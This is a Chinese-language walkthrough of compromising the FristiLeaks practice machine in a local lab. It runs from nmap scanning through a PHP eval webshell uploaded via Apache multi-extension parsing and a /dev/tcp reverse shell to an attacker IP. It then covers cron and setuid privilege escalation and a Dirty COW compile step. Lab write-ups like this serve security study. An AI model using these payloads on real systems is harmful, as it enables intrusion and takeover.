### 靶机安装

> 修改mac为：`08:00:27:A5:A6:76`
>
> http://blog.chinaunix.net/uid-22141042-id-1789609.html

### 端口扫描

```bash
# Nmap 7.94SVN scan initiated Fri Nov  8 04:15:01 2024 as: nmap -sT --min-rate 5000 -p- -oN nmapscan/port_scan 192.168.56.129
Nmap scan report for 192.168.56.129
Host is up (0.0067s latency).
Not shown: 65502 filtered tcp ports (no-response), 32 filtered tcp ports (host-unreach)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
```

```bash
# Nmap 7.94SVN scan initiated Fri Nov  8 04:42:42 2024 as: nmap --script=vuln -p80 -oN nmapscan/script_scan memegenerator.net
Nmap scan report for memegenerator.net (192.168.56.129)
Host is up (0.00040s latency).

PORT   STATE SERVICE
80/tcp open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-trace: TRACE is enabled
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /robots.txt: Robots file
|   /icons/: Potentially interesting folder w/ directory listing
|_  /images/: Potentially interesting folder w/ directory listing
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
```

### web端渗透

查看`robots.txt`

```
User-agent: *
Disallow: /cola
Disallow: /sisi
Disallow: /beer
```

![image-20241108201405201](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241108201405201.png)

三个目录都是这张图片，指向`memegenerator.net`域名

做了个host解析，扫目录没有什么收获

![image-20241108201921571](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241108201921571.png)

要拼接`fristi`目录

#### 后台登录

> http://192.168.56.129/fristi/

![image-20241108202006213](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241108202006213.png)

查看源码给的提示

```
<!-- 
TODO:
We need to clean this up for production. I left some junk in here to make testing easier.

- by eezeepz
-->
```

```
<!-- 
iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl
S0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw
B4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f
m63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ
Zv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb
DpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd
jJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU
12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5
uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1
04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq
i1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg
tOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws
30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl
3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK
ul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q
mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34
rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe
EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH
AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk
CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR
U5ErkJggg==
-->
```

base64转图片

![image-20241108202154667](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241108202154667.png)

`keKkeKKeKKeKkEkkEk`拿到的像是一个密码

`eezeepz`是一个用户

登录成功

然后是一个上传页面，白名单过滤

> Apache HTTPD多后缀解析漏洞
>
> 由于Apache HTTPD支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。所以如果管理员给.`php`后缀增加了处理器
>
> ```
> AddHandler application/x-httpd-php .php
> ```
>
> 那么，在有多个后缀的情况下，只要一个文件含有.php后缀就会被识别成PHP文件，且没必要是最后一个后缀。这个特性就会形成一个可以绕过上传白名单的解析漏洞。
>

```http
POST /fristi/do_upload.php HTTP/1.1
Host: 192.168.56.129
Referer: http://192.168.56.129/fristi/upload.php
Origin: http://192.168.56.129
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOsy32JrRFP2cnWer
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Cookie: PHPSESSID=7937dtrhtfs2837md4b43n8i01
Content-Length: 334

------WebKitFormBoundaryOsy32JrRFP2cnWer
Content-Disposition: form-data; name="fileToUpload"; filename="1.php.png"
Content-Type: image/png

GIF89a
<?php eval($_POST[1]);?>


------WebKitFormBoundaryOsy32JrRFP2cnWer
Content-Disposition: form-data; name="submit"

Upload Image
------WebKitFormBoundaryOsy32JrRFP2cnWer--
```

拿到webshell

```sh
/bin/sh -i >& /dev/tcp/192.168.56.128/1234 0>&1
```

### 提权

在`/home/eezeepz`目录下，有个`note.txt`

```sh
sh-4.1$ cat notes.txt
cat notes.txt
Yo EZ,

I made it possible for you to do some automated checks, 
but I did only allow you access to /usr/bin/* system binaries. I did
however copy a few extra often needed commands to my 
homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
from /home/admin/

Don't forget to specify the full path for each binary!

Just put a file called "runthis" in /tmp/, each line one command. The 
output goes to the file "cronresult" in /tmp/. It should 
run every minute with my account privileges.

- Jerry
```

意思是：只能用`/usr/bin`下的文件，在`/tmp`目录创建`runthis`文件，然后`admin`用户会每一分钟运行它

```bash
echo '/usr/bin/../../bin/chmod 777 /home/admin' > runthis
```

```bash
sh-4.1$ echo '/usr/bin/../../bin/chmod 777 /home/admin' > runthis
echo '/usr/bin/../../bin/chmod 777 /home/admin' > runthis
sh-4.1$ ls -l /home/admin
ls -l /home/admin
total 632
-rwxr-xr-x 1 admin     admin      45224 Nov 18  2015 cat
-rwxr-xr-x 1 admin     admin      48712 Nov 18  2015 chmod
-rw-r--r-- 1 admin     admin        737 Nov 18  2015 cronjob.py
-rw-r--r-- 1 admin     admin         21 Nov 18  2015 cryptedpass.txt
-rw-r--r-- 1 admin     admin        258 Nov 18  2015 cryptpass.py
-rwxr-xr-x 1 admin     admin      90544 Nov 18  2015 df
-rwxr-xr-x 1 admin     admin      24136 Nov 18  2015 echo
-rwxr-xr-x 1 admin     admin     163600 Nov 18  2015 egrep
-rwxr-xr-x 1 admin     admin     163600 Nov 18  2015 grep
-rwxr-xr-x 1 admin     admin      85304 Nov 18  2015 ps
-rw-r--r-- 1 fristigod fristigod     25 Nov 19  2015 whoisyourgodnow.txt
```

然后就可以查看该目录

`cronjob.py`

```python
import os

def writefile(str):
    with open('/tmp/cronresult','a') as er:
        er.write(str)
        er.close()

with open('/tmp/runthis','r') as f:
    for line in f:
        #does the command start with /home/admin or /usr/bin?
        if line.startswith('/home/admin/') or line.startswith('/usr/bin/'):
            #lets check for pipeline
            checkparams= '|&;'
            if checkparams in line:
                writefile("Sorry, not allowed to use |, & or ;")
                exit(1)
            else:
                writefile("executing: "+line)
                result =os.popen(line).read()
                writefile(result)
        else:
            writefile("command did not start with /home/admin or /usr/bin")
```

`cryptpass.py`

```python
#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

cryptoResult=encodeString(sys.argv[1])
print cryptoResult
```

先是Base64编码，然后是ROT13编码。最后，它打印出编码后的结果

`whoisyourgodnow.txt`

> =RFn0AKnlMHMPIzpyuTI0ITG

![image-20241108204617477](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241108204617477.png)

`LetThereBeFristi!`

登录用户`fristigod`

```bash
sh-4.1$ su fristigod
su fristigod
standard in must be a tty
sh-4.1$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
bash-4.1$ su fristigod
su fristigod
Password: LetThereBeFristi!

bash-4.1$ id
id
uid=502(fristigod) gid=502(fristigod) groups=502(fristigod)
```

```bash
bash-4.1$ ls -al
ls -al
total 16
drwxr-x---   3 fristigod fristigod 4096 Nov 25  2015 .
drwxr-xr-x. 19 firefart  root      4096 Nov 19  2015 ..
-rw-------   1 fristigod fristigod 1026 Nov  8 07:25 .bash_history
drwxrwxr-x.  2 fristigod fristigod 4096 Nov 25  2015 .secret_admin_stuff
bash-4.1$ cd .secret_admin_stuff
cd .secret_admin_stuff
bash-4.1$ ls
ls
doCom
bash-4.1$ ls -la
ls -la
total 16
drwxrwxr-x. 2 fristigod fristigod 4096 Nov 25  2015 .
drwxr-x---  3 fristigod fristigod 4096 Nov 25  2015 ..
-rwsr-sr-x  1 firefart  root      7529 Nov 25  2015 doCom
bash-4.1$ file doCom
file doCom
doCom: setuid setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.18, not stripped
```

`doCom`有suid权限，且是一个可执行文件

![image-20241108205312565](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241108205312565.png)

首先判断uid是否是`503`,然后就可以执行命令

```bash
bash-4.1$ sudo -u fristi ./doCom id
sudo -u fristi ./doCom id
[sudo] password for fristigod: LetThereBeFristi!

uid=0(firefart) gid=100(users) groups=100(users),502(fristigod)
bash-4.1$ sudo -u fristi ./doCom bash
sudo -u fristi ./doCom bash
```

成功拿到root

#### 脏牛提权

```bash
gcc -pthread 40839.c -o dirty -lcrypt
```

```bash
./dirty
```

